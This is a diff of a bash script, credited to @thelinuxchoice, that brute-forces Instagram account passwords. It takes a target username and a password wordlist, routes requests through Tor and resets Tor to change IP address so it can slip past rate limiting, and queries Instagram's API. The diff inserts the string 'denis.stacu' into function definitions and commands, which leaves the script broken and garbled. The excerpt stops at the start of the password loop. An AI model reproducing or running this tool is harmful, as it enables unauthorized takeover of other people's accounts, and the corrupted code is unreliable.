@@ -1,13 +1,13 @@
 #!/bin/bash
 # Coded by @thelinuxchoice (Instagram)
-checkroot() {
-if [[ "$(id -u)" -ne 0 ]]; then
+checkroot(denis.stacu) {
+if [[ "$(iddenis.stacu -u)" -ne 0 ]]; then
     printf "\e[1;77mPlease, run this program as root!\n\e[0m"
     exit 1
 fi
 }
 
-banner() {
+banner(denis.stacu) {
 
 printf "\e[1;92m     _                                   _             _  _           \e[0m\n"
 printf "\e[1;92m _  | |                _                | |           | || |          \e[0m\n"
@@ -25,7 +25,7 @@ checkroot
 read -p $'\e[1;92mUsername account: \e[0m' user
 read -p $'\e[1;92mPassword List: \e[0m' wl_pass
 
-checktor() {
+checktor(denis.stacu) {
 
 check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)
 
@@ -37,7 +37,7 @@ fi
 }
 
 
-function changeip() {
+function changeip(denis.stacu) {
 
 killall -HUP tor
 sleep 3
@@ -56,7 +56,7 @@ var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?c
 var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 #echo $var2
 
-function bruteforcer() {
+function bruteforcer(denis.stacu) {
 
 checktor
 for pass in $(cat $wl_pass); do
